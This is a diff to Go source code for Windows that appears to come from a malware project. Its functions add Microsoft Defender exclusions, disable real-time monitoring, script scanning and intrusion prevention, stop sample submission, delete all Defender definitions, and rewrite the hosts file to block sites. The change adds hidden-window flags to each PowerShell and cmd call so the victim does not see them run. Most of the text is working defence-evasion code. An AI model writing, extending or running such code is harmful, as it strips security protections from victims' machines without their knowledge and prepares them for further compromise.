@@ -6,6 +6,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"syscall"
 
 	"strings"
 
@@ -57,7 +58,9 @@ func ExcludeFromDefender() error {
 		return err
 	}
 
-	return exec.Command("powershell", "-Command", "Add-MpPreference", "-ExclusionPath", path).Run()
+	cmd := exec.Command("powershell", "-Command", "Add-MpPreference", "-ExclusionPath", path)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	return cmd.Run()
 }
 
 func DisableDefender() error {
@@ -65,17 +68,26 @@ func DisableDefender() error {
 		return errors.New("not elevated")
 	}
 
-	err := exec.Command("powershell", "Set-MpPreference", "-DisableIntrusionPreventionSystem", "$true", "-DisableIOAVProtection", "$true", "-DisableRealtimeMonitoring", "$true", "-DisableScriptScanning", "$true", "-EnableControlledFolderAccess", "Disabled", "-EnableNetworkProtection", "AuditMode", "-Force", "-MAPSReporting", "Disabled", "-SubmitSamplesConsent", "NeverSend").Run()
+	cmd := exec.Command("powershell", "Set-MpPreference", "-DisableIntrusionPreventionSystem", "$true", "-DisableIOAVProtection", "$true", "-DisableRealtimeMonitoring", "$true", "-DisableScriptScanning", "$true", "-EnableControlledFolderAccess", "Disabled", "-EnableNetworkProtection", "AuditMode", "-Force", "-MAPSReporting", "Disabled", "-SubmitSamplesConsent", "NeverSend")
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+
+	_, err := cmd.Output()
 	if err != nil {
 		return err
 	}
 
-	err = exec.Command("powershell", "Set-MpPreference", "-SubmitSamplesConsent", "2").Run()
+	cmd = exec.Command("powershell", "Set-MpPreference", "-SubmitSamplesConsent", "2")
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+
+	_, err = cmd.Output()
 	if err != nil {
 		return err
 	}
 
-	return exec.Command("cmd", "/c", fmt.Sprintf("%s\\Windows Defender\\MpCmdRun.exe", os.Getenv("ProgramFiles")), "-RemoveDefinitions", "-All").Run()
+	cmd = exec.Command("cmd", "/c", fmt.Sprintf("%s\\Windows Defender\\MpCmdRun.exe", os.Getenv("ProgramFiles")), "-RemoveDefinitions", "-All")
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+
+	return cmd.Run()
 }
 
 func BlockSites(sites []string) error {
@@ -108,7 +120,10 @@ func BlockSites(sites []string) error {
 	d := strings.Join(newData, "\n")
 	d = strings.ReplaceAll(d, "\n\n", "\n")
 
-	err = exec.Command("attrib", "-r", hostFilePath).Run()
+	cmd := exec.Command("attrib", "-r", hostFilePath)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+
+	err = cmd.Run()
 	if err != nil {
 		return err
 	}
@@ -117,5 +132,8 @@ func BlockSites(sites []string) error {
 		return err
 	}
 
-	return exec.Command("attrib", "+r", hostFilePath).Run()
+	cmd = exec.Command("attrib", "+r", hostFilePath)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+
+	return cmd.Run()
 }
